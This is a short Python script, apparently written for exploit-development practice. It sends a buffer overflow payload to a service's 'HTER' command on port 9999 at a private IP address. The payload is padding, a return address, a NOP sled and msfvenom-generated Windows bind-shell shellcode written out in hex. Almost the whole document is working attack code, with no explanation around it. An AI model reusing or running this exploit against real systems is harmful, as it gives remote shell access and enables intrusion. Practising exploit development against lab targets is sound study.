#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
from struct import pack
import time

host = '172.16.192.168'
port = 9999

# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f hex
shellcode = ("d9ecb81cf65c70d97424f45e33c9b15331461703461783daf2be851e"
			 "12bc66dee3a1ef3bd2e1944845d2df1c6a99b2b4f9ef1abb4a457df2"
			 "4bf6bd95cf059275f1c5e774363b0524ef37b8d884020153d6830180"
			 "afa22017bbfce2966875ab806db0653b454e74ed97afdbd017422515"
			 "9fbd506fe34063b4999ee62e3954508abbb90759b7764305d489803e"
			 "e002279060500c3428022d6d94e5526d7759f7e69a8e8aa5f263a755"
			 "03ecb02631b36aa0793cb5377d1701a7809872ee46cc22986f6da958"
			 "8fb8445036137b9d88c33b0d610eb47291311e1b3acca132e759475e"
			 "070cdff6e56be861155e40055e88572a5f9effbcd4cd3bddeadb6b8a"
			 "7d91fdf91ca6d769bc35bc69cb256b3e9c9862aa3082dcc8c8522648"
			 "17a7a951da938d41221b8a35fa4a44e3bc24265d179ae009eed0324f"
			 "ef3cc5af5ee990d06f7d15a98d1dda60163d39a063d6e421cebb169c"
			 "0dc29414ee31845deb7e028e81efe7b0360f22"

payload = "A" * (2041)
payload += "AF115062"	
payload += "90" * 20
payload += shellcode
payload += "A" * (3000 - len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)
print "[*] Sending payload of size: {0} chars...".format(len(payload))

s.send("HTER " + payload )

s.close()
